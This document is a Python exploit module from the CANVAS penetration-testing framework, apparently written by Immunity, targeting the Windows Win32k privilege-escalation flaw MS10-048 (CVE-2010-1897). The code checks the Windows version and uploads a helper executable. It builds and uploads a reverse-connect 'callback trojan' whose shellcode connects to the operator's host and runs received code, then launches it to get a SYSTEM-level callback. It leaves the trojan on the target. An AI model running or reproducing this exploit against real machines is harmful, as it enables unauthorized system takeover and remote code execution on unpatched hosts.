#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  ms10_048.py
## Description:
##            :
## Created_On :  Tue Aug 10 13:46:20 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Tue Aug 10 13:48:49 2010
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
##
## vim: sw=4 ts=4 expandtab
###############################################################################

import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from canvasexploit import canvasexploit
from exploitutils import *
import shellcode.standalone.windows.payloads as payloads
from shellcode import shellcodeGenerator
from MOSDEF import pelib

NAME                                = 'ms10_048'
VERSION                             = '1.0'
DESCRIPTION                         = 'Win32k Window Creation Vulnerability (CBT Hook)'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = 'Microsoft'
DOCUMENTATION['Repeatability']      = 'Single Shot'
DOCUMENTATION['VersionsAffected']   = 'Windows'
DOCUMENTATION['CVE Name']           = 'CVE-2010-1897'
DOCUMENTATION['CVE URL']            = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1897'
DOCUMENTATION['CVSS']               = 6.6

DOCUMENTATION["Notes"]              = """
Reliably exploits Windows XP through Windows 7 (32-bit). When executed, this will get a callback
that runs as Local/SYSTEM.

This also exploits Windows 7 x64.

"""

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Local'
PROPERTY['ARCH']                    = [ ['Windows', 'i386', 'x64'] ]
PROPERTY['VERSION']                 = [ 'XP SP3', '2003', 'Vista', '2008', '7']
PROPERTY['MS PATCHES']              = ["KB2160329"]

import random

from ExploitTypes.localexploit import LocalExploit

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.files     =  {'x86' :'ms10_048.exe', 'x64': 'ms10_048-x86-64.exe' }

        #get path relative to our canvas_root_directory
        from engine.config import canvas_root_directory
        self.local_path     = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))

        self.remote_path    = '%TMP%\\' # remote base path
        self.trojan_name    = 'CB%4.4d.EXE'%random.randint(0,5000)

    def get_args(self):
        """
        Retrieve and initialize arguments
        """
        self.node           = self.argsDict['passednodes'][0]
        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def init_DOJIBIRON(self):
        """
        Uploads the DOJIBIRON exe
        """
        #first we do versioning
        #we can be in win32, or in win64 nodes
        #and if we are in win32, we can be in Windows on Windows (32-bit process on x64 Windows)
        #For WoW we want the x64 binaries.
        use_x64 = False
        if self.node.nodetype == "win32Node":
            #if WoW, then use x64
            if self.node.shell.is_wow_64:
                use_x64 = True
        elif self.node.nodetype == "win64Node":
            use_x64 = True

        self.use_x64 = use_x64 #save this off for later just in case

        if use_x64:
            filename = self.files["x64"]
        else:
            filename = self.files["x86"]

        src = os.path.join(self.local_path, filename)
        dst = self.remote_path + filename
        self.filename = dst  #save this off for later
        try:
            self.node.shell.upload(src, destfilename = dst)
            self.log('[+] Uploaded %s to %s' % (src, dst))
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            self.log('[-] Could not upload %s to %s' % (src, dst))
            return False
        return True

    def uninit_DOJIBIRON(self):
        """
        Remove the DOJIBIRON exe
        """
        try:
            ret = self.node.shell.unlink(self.filename)
            self.log('[+] %s' % ret)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def spawn_DOJIBIRON(self, arg):
        """
        spawn DOJIBIRON
        """
        try:
            # CREATE_NO_WINDOW|CREATE_NEW_PROCESS_GROUP
            process_to_create = self.filename + ' ' +'"'+arg+'"'
            self.log("Process to create: %s"%process_to_create)
            ret = self.node.shell.CreateProcessA(process_to_create,
                                                 inherithandles=0,
                                                 dwCreationFlags = 0x08000200)

            if not ret:
                return False
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def init_callback(self):
        """
        Build + upload the MOSDEF callback trojan. On x64 capabable
        systems we use the x64 callback.
        """
        if not self.callback:
            self.log('[-] No callback set!')
            return False
        trojan = ''
        try:
            sc = shellcodeGenerator.win32()
            sc.addAttr('findeipnoesp', {'subespval': 0})
            sc.addAttr('revert_to_self_before_importing_ws2_32', None)
            sc.addAttr('tcpconnect', {'port' : self.callback.port,
                                      'ipaddress' : self.callback.ip})
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
            sc.addAttr("ExitThread",None)
            sc.vAllocSelf = True #we need to move to another page!
            callback_payload = sc.get()
            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(callback_payload)

            # write out the binary
            src = os.path.join(self.local_path, self.trojan_name)
            self.log('[+] Creating callback trojan in %s' % src)
            fd = open(src, 'wb')
            fd.write(trojan)
            fd.close()
            # upload the binary
            self.log('[+] Uploading callback trojan ...')
            ret = self.node.shell.upload(src, destfilename = self.remote_path + self.trojan_name)
            self.log('[+] %s' % ret)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def run(self):

        self.get_args()

        if self.node.nodetype.lower() not in ['win32node', 'win64node']:
            self.log('[-] Node Type not supported ...')
            return False

        #first, we check to make sure we are not
        #already local/SYSTEM - is there a better way?
        whoami=self.exploitnodes('whoami',[self.node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            #will this fail if they're running under a service account?
            self.log("It appears you are already running as LOCAL/SYSTEM!")
            return 1

        ret,nodeos=self.node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        product=nodeos['Product Type']
        self.log('Attacking Windows %d.%d'%(major,minor))

        if major==5 and minor==1:
            self.log("Windows XP found")
            if nodeos["SP string"] not in  ["Service Pack 2", "Service Pack 3"]:
                self.log("This exploit is for Windows XP SP2/3 only.")
                return 0
        elif major == 5 and minor == 2 and product == 1:
            self.log("Windows XP Professional x64 found")
        elif major==5 and minor==2:
            self.log("Windows 2003 found")
            if nodeos["SP string"] not in  ["Service Pack 2"]:
                self.log("This exploit is for Windows 2003 2 only (at the moment)")
                return 0
        elif major==6 and minor==0 and product == 1:
            self.log("Windows Vista found")
        elif major==6 and minor==0:
            self.log("Windows 2008 found")
        elif major==6 and minor==1 and product == 1:
            self.log("Windows 7 found")
        elif major==6 and minor==1:
            self.log("Windows 2008 R2 found")
        else:
            self.log("This Windows platform is not supported, sorry!")
            return 0

        #XXX: should we really be using Unicode here? Need to test on Japanse/Chinese/etc.
        self.remote_path = self.node.shell.GetTempPathA()
        if not self.remote_path:
            self.log('[-] Could not resolve full temp dir path ...')
            return False
        else:
            self.log('[-] Temp dir: %s' % self.remote_path)

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('[-] Could not chdir into %s' % self.remote_path)
            return False

        # build and upload callback trojan
        if self.init_callback() == False:
            self.log('[-] Could not init callback ...')
            return False

        # upload dojibiron binary
        if self.init_DOJIBIRON() == False:
            self.log('[-] Could not init DOJIBIRON ...')
            return False

        # spawn dojibiron
        if self.spawn_DOJIBIRON(self.remote_path + self.trojan_name) == False:
            self.log('[-] Could not spawn DOJIBIRON ...')
            return False

        self.log('[+] Sleeping 30 seconds before DOJIBIRON uninit ...')
        for i in xrange(0,6):
            time.sleep(5)
            if self.ISucceeded():
                break

        # remove files ... can't remove trojan (active process)
        if self.uninit_DOJIBIRON() == False:
            self.log('[-] Could not uninit DOJIBIRON ...')
            return False

        self.log('[+] NOTE: %s\\%s still exists on the host!' % (self.remote_path, self.trojan_name))

        # check for callback success ...
        if self.ISucceeded():
            self.log('[+] DOJIBIRON succeeded ...')
        else:
            self.log('[-] DOJIBIRON failed ...')
            return False

        return True

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
